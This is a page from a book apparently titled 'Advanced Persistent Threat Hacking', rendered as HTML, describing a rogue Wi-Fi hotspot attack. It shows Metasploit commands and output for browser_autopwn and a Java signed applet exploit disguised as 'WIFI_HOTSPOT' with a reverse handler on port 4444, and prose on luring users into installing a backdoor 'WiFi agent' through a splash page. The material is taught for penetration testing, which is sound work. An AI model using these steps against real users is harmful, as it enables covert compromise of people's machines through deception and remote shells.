<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf11f" class="pf w2 h2" data-page-no="11f"><div class="pc pc11f w2 h2"><div class="t m0 xbe h10 y83 ff1 fs9 fc0 sc0 lsa ws0">264<span class="_ _d"> </span><span class="ff2 fs2 ls8">Advanced Persistent Threat Hacking<span class="_ _1e"/> </span></div><div class="t m0 x3 h44 yb3f fff fse fc0 sc0 ls0 ws0">[*] Done in 1.291787524 seconds</div><div class="t m0 x3 h44 yb40 fff fse fc0 sc0 ls0 ws0">msf auxiliary(browser_autopwn) &gt; </div><div class="t m0 x3 h44 y1ba0 fff fse fc0 sc0 ls0 ws0">--- SNIP ---</div><div class="t m0 x3 h44 y1ba1 fff fse fc0 sc0 ls0 ws0">[*] --- Done, found 66 exploit modules</div><div class="t m0 x3 h44 y1ba2 fff fse fc0 sc0 ls0 ws0">[*] Using URL: http://0.0.0.0:81/</div><div class="t m0 x3 h44 y1ba3 fff fse fc0 sc0 ls0 ws0">[*]  Local IP: http://10.0.0.1:81/</div><div class="t m0 x3 h44 y1ba4 fff fse fc0 sc0 ls0 ws0">[*] Server started.</div><div class="t m0 x4 hd y1ba5 ff4 fs7 fc0 sc0 ls0 ws0">If you choose to include the Jav<span class="_ _0"/>a self-signed applet as well, you can congure </div><div class="t m0 x3 hd y1ba6 ff4 fs7 fc0 sc0 ls0 ws0">Metasploit as follo<span class="_ _0"/>ws:</div><div class="t m0 x3 h44 y1ba7 fff fse fc0 sc0 ls0 ws0">msf &gt; use exploit/multi/browser/java_signed_applet</div><div class="t m0 x3 h44 y1ba8 fff fse fc0 sc0 ls0 ws0">msf exploit(java_signed_applet) &gt; set SRVPORT 82</div><div class="t m0 x3 h44 y1ba9 fff fse fc0 sc0 ls0 ws0">SRVPORT =&gt; 82</div><div class="t m0 x3 h44 y1baa fff fse fc0 sc0 ls0 ws0">msf exploit(java_signed_applet) &gt; set APPLETNAME WIFI_HOTSPOT</div><div class="t m0 x3 h44 y1bab fff fse fc0 sc0 ls0 ws0">APPLETNAME =&gt; WIFI_HOTSPOT</div><div class="t m0 x3 h44 y1bac fff fse fc0 sc0 ls0 ws0">msf exploit(java_signed_applet) &gt; set CERTCN WIFI_HOTSPOT</div><div class="t m0 x3 h44 y1bad fff fse fc0 sc0 ls0 ws0">CERTCN =&gt; WIFI_HOTSPOT</div><div class="t m0 x3 h44 y1bae fff fse fc0 sc0 ls0 ws0">msf exploit(java_signed_applet) &gt; set URIPATH /java</div><div class="t m0 x3 h44 y1baf fff fse fc0 sc0 ls0 ws0">msf exploit(java_signed_applet) &gt; exploit</div><div class="t m0 x3 h44 y1bb0 fff fse fc0 sc0 ls0 ws0">[*] Exploit running as background job.</div><div class="t m0 x3 h44 y1bb1 fff fse fc0 sc0 ls0 ws0">msf exploit(java_signed_applet) &gt; </div><div class="t m0 x3 h44 y1bb2 fff fse fc0 sc0 ls0 ws0">[*] Started reverse handler on 10.0.0.1:4444 </div><div class="t m0 x3 h44 y1bb3 fff fse fc0 sc0 ls0 ws0">[*] Using URL: http://0.0.0.0:82/java</div><div class="t m0 x3 h44 y1bb4 fff fse fc0 sc0 ls0 ws0">[*]  Local IP: http://10.0.0.1:82/java</div><div class="t m0 x3 h44 y1bb5 fff fse fc0 sc0 ls0 ws0">[*] Server started.</div><div class="t m0 x4 hd y1bb6 ff4 fs7 fc0 sc0 ls0 ws0">K<span class="_ _0"/>eep in mind that you must determine when to enable the browser_autopwn and </div><div class="t m0 x3 hd y1bb7 ff4 fs7 fc0 sc0 ls0 ws0">Jav<span class="_ _0"/>a-signed applet e<span class="_ _0"/>xploits. T<span class="_ _3"/>o disable any specic e<span class="_ _0"/>xploit, you can simply comment </div><div class="t m0 x3 hd y1bb8 ff4 fs7 fc0 sc0 ls0 ws0">out the rele<span class="_ _0"/>vant lines from inject.php.</div><div class="t m0 x4 hd y1bb9 ff4 fs7 fc0 sc0 ls0 ws0">One nal option is to prompt the user to install an ex<span class="_ _0"/>ecutable or run a Jav<span class="_ _0"/>a-</div><div class="t m0 x3 hd y1bba ff4 fs7 fc0 sc0 ls0 ws0">signed applet to utilize the free hotspot. Many hotspots require a user to accept </div><div class="t m0 x3 hd y1bbb ff4 fs7 fc0 sc0 ls0 ws0">terms of service, and some require users to keep a small bro<span class="_ _0"/>wser windo<span class="_ _0"/>w open, so </div><div class="t m0 x3 hd y1bbc ff4 fs7 fc0 sc0 ls0 ws0">our requirement to run an “agent” really isn’t that f<span class="_ _0"/>ar of a stretch. <span class="_ _0"/>W<span class="_ _2"/>e could e<span class="_ _0"/>ven </div><div class="t m0 x3 hd y1bbd ff4 fs7 fc0 sc0 ls0 ws0">gi<span class="_ _0"/>ve the user the option between authenticating with a kno<span class="_ _0"/>wn entity (like Google </div><div class="t m0 x3 hd y1bbe ff4 fs7 fc0 sc0 ls0 ws0">or Facebook) or running the agent. <span class="_ _0"/>T<span class="_ _3"/>o do this, we can create a simple static HTML </div><div class="t m0 x3 hd y1bbf ff4 fs7 fc0 sc0 ls0 ws0">splash page that instructs the user to run the “W<span class="_ _0"/>iFi agent” in order to access the </div><div class="t m0 x3 hd y1bc0 ff4 fs7 fc0 sc0 ls0 ws0">Internet. Belie<span class="_ _0"/>ve it or not, I’<span class="_ _2"/>ve used pages as simple as Figure 7-20, and users hav<span class="_ _0"/>e </div><div class="t m0 x3 hd y1bc1 ff4 fs7 fc0 sc0 ls0 ws0">installed the backdoor<span class="_ _2"/>. If we wanted to add additional functionality to our backdoor </div><div class="t m0 x3 hd y1bc2 ff4 fs7 fc0 sc0 ls0 ws0">we could hav<span class="_ _0"/>e it access a particular URL on our server once the backdoor has been </div><div class="t m0 x3 hd y1bc3 ff4 fs7 fc0 sc0 ls0 ws0">correctly installed, and then allo<span class="_ _0"/>w the user out to use the Internet.</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>